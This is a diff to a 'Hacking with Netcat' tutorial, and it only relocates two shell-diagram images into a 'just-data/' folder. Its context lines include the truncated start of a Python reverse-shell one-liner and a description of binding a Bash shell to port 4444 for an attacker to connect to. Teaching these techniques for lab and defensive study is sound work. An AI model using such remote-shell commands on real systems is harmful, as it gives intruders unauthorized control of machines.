@@ -56,7 +56,7 @@ In the following paragraphs we will be demonstrating the use of bind and reverse
 #### Setting up Netcat Reverse Shells
 
 
-![](ncatrevshell.jpg)
+![](just-data/ncatrevshell.jpg)
 
 In order to setup a Netcat reverse shell we need to follow the following steps:
 
@@ -121,7 +121,7 @@ $ python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket
 As we’ve mentioned earlier in this Hacking with Netcat tutorial a bind shell is a shell that binds to a specific port on the target host to listen for incoming connections. Let’s have a look at the visualization of a bind Netcat shell:
 
 
-![](ncatbindshell.jpg)
+![](just-data/ncatbindshell.jpg)
 
 
 In this visualization the target binds a Bash shell to port 4444 using a Netcat listener. The attacker connects to this port using a simple Netcat command. The steps to setup a bind shell are as following:
